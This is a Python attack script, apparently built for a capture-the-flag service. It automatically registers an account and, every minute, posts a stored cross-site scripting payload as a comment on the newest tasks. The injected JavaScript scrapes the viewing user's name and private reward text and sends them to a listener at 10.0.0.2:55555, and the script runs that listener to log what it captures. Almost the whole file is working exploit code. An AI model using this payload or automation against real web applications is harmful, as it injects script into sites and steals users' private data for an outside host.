#!/usr/bin/env python3

from urllib.parse import parse_qs, urljoin, urlparse
from bs4 import BeautifulSoup
import http.server
import threading
import requests
import random
import string
import json
import sys


LISTEN_HOST = "0.0.0.0"
PORT = 55555
OUT_FILE = "out.txt"
SERVICE_HOST = f'http://{sys.argv[1]}:3000'
POLL_INTERVAL = 60
COMMENT_TEXT = '''<img src='x' onerror='fetch("/profile").then(function(t){return t.text()}).then(function(t){let e=new DOMParser().parseFromString(t,"text/html"),r=e.querySelector(".profile-username");return r?r.textContent.trim():""}).then(function(t){if(t)return fetch("/").then(function(t){return t.text()}).then(function(e){let r=new DOMParser().parseFromString(e,"text/html"),n=Array.from(r.querySelectorAll(".task-card")),u=n.filter(function(e){let r=e.querySelector(".task-card__meta img"),n=(r&&(r.getAttribute("title")||r.getAttribute("alt")||"")).trim();return n===t}).map(function(t){let e=t.querySelector(".task-card__title a");return e?e.getAttribute("href"):null}).filter(Boolean);return Promise.all(u.map(function(t){return fetch(t).then(function(t){return t.text()}).then(function(t){let e=new DOMParser().parseFromString(t,"text/html"),r=e.querySelector(".reward-panel__text");return r?r.textContent.trim():null})}))}).then(function(e){let r=e.filter(Boolean);fetch("http://10.0.0.2:55555/?flag="+encodeURIComponent(JSON.stringify({user:t,rewards:r})))})});'>'''


class FlagHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        flag_values = params.get("flag", [])

        if flag_values:
            try:
                with open(OUT_FILE, "a", encoding="utf-8") as f:
                    for val in flag_values:
                        f.write(val + "\n")
                        print(val, flush=True)
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(f"error writing file: {e}".encode())
                return
        self.send_response(200)
        self.end_headers()
        resp = {"received": bool(flag_values), "count": len(flag_values)}
        self.wfile.write(json.dumps(resp).encode())

    def log_message(self, format, *args):
        return


def rnd_string(length: int = 12) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def get_csrf(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    meta = soup.find("meta", attrs={"name": "csrf-token"})
    if meta and meta.get("content"):
        return meta["content"]
    token_input = soup.find("input", attrs={"name": "authenticity_token"})
    return token_input["value"] if token_input else ""


def register_account(host: str) -> requests.Session:
    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
    )

    signup = session.get(urljoin(host, "/users/sign_up"))
    signup.raise_for_status()
    token = get_csrf(signup.text)
    if not token:
        raise RuntimeError("No CSRF token on sign-up page")

    username = rnd_string(8)
    email = f"{username}"
    password = rnd_string(random.randint(10, 14))

    payload = {
        "authenticity_token": token,
        "user[email]": email,
        "user[password]": password,
        "user[password_confirmation]": password,
        "commit": "Зарегистрироваться",
    }
    resp = session.post(urljoin(host, "/users"), data=payload, allow_redirects=True)
    resp.raise_for_status()

    print(f"Registered user: {email}", flush=True)
    return session


def fetch_last_two_task_ids(host: str, session: requests.Session):
    resp = session.get(urljoin(host, "/"))
    resp.raise_for_status()
    soup = BeautifulSoup(resp.text, "html.parser")
    ids = []
    for a in soup.find_all("a", href=True):
        if len(ids) >= 2:
            break
        href = a["href"]
        if href.startswith("/tasks/"):
            try:
                tid = int(href.split("/tasks/")[1].split("/")[0])
                if tid not in ids:
                    ids.append(tid)
            except Exception:
                continue
    return ids[:2]


def post_comment(host: str, session: requests.Session, task_id: int):
    page = session.get(urljoin(host, f"/tasks/{task_id}"))
    page.raise_for_status()
    token = get_csrf(page.text)
    if not token:
        raise RuntimeError("No CSRF token on task page")
    payload = {
        "authenticity_token": token,
        "comment[body]": COMMENT_TEXT,
        "commit": "Отправить",
    }
    resp = session.post(urljoin(host, f"/tasks/{task_id}/comments"), data=payload, allow_redirects=True)
    resp.raise_for_status()


def comment_loop(session: requests.Session, host: str, stop_event: threading.Event):
    while not stop_event.is_set():
        try:
            task_ids = fetch_last_two_task_ids(host, session)
            for tid in task_ids:
                try:
                    post_comment(host, session, tid)
                    print(f"Commented on task {tid}", flush=True)
                except Exception as e:
                    print(f"Comment error on task {tid}: {e}", flush=True)
        except Exception as e:
            print(f"Comment fetch error: {e}", flush=True)
        stop_event.wait(POLL_INTERVAL)


def run():
    service_host = SERVICE_HOST
    session = None
    try:
        session = register_account(service_host)
    except Exception as e:
        print(f"Failed to register account: {e}", flush=True)

    stop_event = threading.Event()
    comment_thread = None
    if session:
        comment_thread = threading.Thread(target=comment_loop, args=(session, service_host, stop_event), daemon=True)
        comment_thread.start()

    server = http.server.HTTPServer((LISTEN_HOST, PORT), FlagHandler)
    try:
        print(f"Listening on http://{LISTEN_HOST}:{PORT}", flush=True)
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
        stop_event.set()
        if comment_thread:
            comment_thread.join(timeout=2)


if __name__ == "__main__":
    run()
